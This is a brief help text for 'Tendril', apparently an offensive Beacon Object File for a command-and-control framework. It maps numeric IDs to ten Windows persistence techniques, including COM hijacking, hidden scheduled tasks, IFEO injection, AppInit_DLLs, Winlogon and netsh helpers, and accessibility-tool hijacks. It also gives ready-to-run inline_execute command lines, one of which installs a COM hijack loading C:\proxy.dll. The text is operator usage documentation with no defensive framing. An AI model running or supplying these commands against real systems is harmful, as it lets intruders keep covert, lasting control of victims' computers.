help_long:
Tendril persistence BOF — unified dispatch.
Format: ssZZZ (two int16 IDs + three wide strings)

Module IDs: 0=com_hijack 1=ghost_task 2=registry_run 3=screensaver
            4=ifeo_inject 5=appinit_dlls 6=winlogon_helper 7=accessibility
            8=netsh_helper 9=userinit_mpr
Action IDs: 0=install 1=remove 2=check

Examples:
  inline_execute -BOF tendril.x64.o -Arguments "0 0 C:\proxy.dll {BCDE0395} Both" -ArgumentTypes ssZZZ
  inline_execute -BOF tendril.x64.o -Arguments "1 2 "" "" """ -ArgumentTypes ssZZZ
